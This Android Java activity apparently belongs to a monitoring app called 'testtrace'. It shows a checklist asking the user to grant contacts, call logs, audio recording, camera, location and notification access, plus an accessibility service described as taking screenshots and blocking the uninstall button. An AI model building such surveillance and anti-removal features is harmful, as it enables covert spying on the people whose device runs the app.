package com.reiserx.testtrace.Permissions;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.os.Bundle;
import android.view.Menu;
import android.view.MenuItem;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.recyclerview.widget.LinearLayoutManager;

import com.reiserx.testtrace.R;
import com.reiserx.testtrace.databinding.ActivityPermissionsBinding;

import java.util.ArrayList;

public class PermissionsActivity extends AppCompatActivity {

    ActivityPermissionsBinding binding;

    ArrayList<PermissionsModel> data;
    PermissionsAdapter adapter;

    PermissionsModel permissionsModel;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        binding = ActivityPermissionsBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        setTitle("Checklist");

        data = new ArrayList<>();
        binding.rec.setLayoutManager(new LinearLayoutManager(this));
        adapter = new PermissionsAdapter(this, data, PermissionsActivity.this);
        binding.rec.setAdapter(adapter);

        permissionsModel = new PermissionsModel(true, "PERMISSIONS");
        data.add(permissionsModel);

        permissionsModel = new PermissionsModel("STORAGE", "Used for files and media operations", 1, false);
        data.add(permissionsModel);
        permissionsModel = new PermissionsModel("READ_CONTACTS", "Get device contact list", 2, false);
        data.add(permissionsModel);
        permissionsModel = new PermissionsModel("READ_CALL_LOG", "Used to get call logs", 3, false);
        data.add(permissionsModel);
        permissionsModel = new PermissionsModel("RECORD_AUDIO", "microphone permission for audio recording", 4, false);
        data.add(permissionsModel);
        permissionsModel = new PermissionsModel("CAMERA", "Used to take pictures", 5, false);
        data.add(permissionsModel);
        permissionsModel = new PermissionsModel("LOCATION", "Used to get device location", 6, false);
        data.add(permissionsModel);

        permissionsModel = new PermissionsModel(true, "SPECIAL ACCESS");
        data.add(permissionsModel);

        permissionsModel = new PermissionsModel("DRAW_OVER_OTHER_APPS", "Used for proper launching of the application and camera services", 7, false);
        data.add(permissionsModel);
        permissionsModel = new PermissionsModel("USAGE_STATS_ACCESS", "Used to get devivce usage stats", 8, false);
        data.add(permissionsModel);
        permissionsModel = new PermissionsModel("NOTIFICATION_ACCESS", "Access notifications", 9, false);
        data.add(permissionsModel);

        permissionsModel = new PermissionsModel(true, "SERVICES");
        data.add(permissionsModel);

        permissionsModel = new PermissionsModel("ACCESSIBILITY_SERVICE", "Used for Screenshots, record audios, take pictures with camera, block uninstall button", 10, false);
        data.add(permissionsModel);

        permissionsModel = new PermissionsModel(true, "BATTERY");
        data.add(permissionsModel);

        permissionsModel = new PermissionsModel("IGNORE_BATTERY_OPTIMIZATION", "Used for permanent functioning of the main service", 11, false);
        data.add(permissionsModel);

        adapter.notifyDataSetChanged();
    }

    @SuppressLint("SetTextI18n")
    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        switch (requestCode) {
            case 2296:
                adapter.notifyDataSetChanged();
                break;
        }
        super.onActivityResult(requestCode, resultCode, data);
    }

    @SuppressLint("SetTextI18n")
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        switch (requestCode) {
            case 100: {
                adapter.notifyDataSetChanged();
            }
        }
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }

    @Override
    public boolean onOptionsItemSelected(@NonNull MenuItem item) {
        switch (item.getItemId()) {
            case R.id.perm_info:
                AlertDialog.Builder dialog = new AlertDialog.Builder(this);
                dialog.setTitle("Checklist");
                dialog.setMessage("Please make sure to enable everything in checklist\nFor OPPO/VIVO/XIAOMI/OTHER CHINESE PHONES please enable auto start for REISERX from AppInfo > Auto start > enable");
                dialog.setPositiveButton("ok", null);
                dialog.show();
                break;
        }
        return super.onOptionsItemSelected(item);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.menu2, menu);
        return super.onCreateOptionsMenu(menu);
    }
}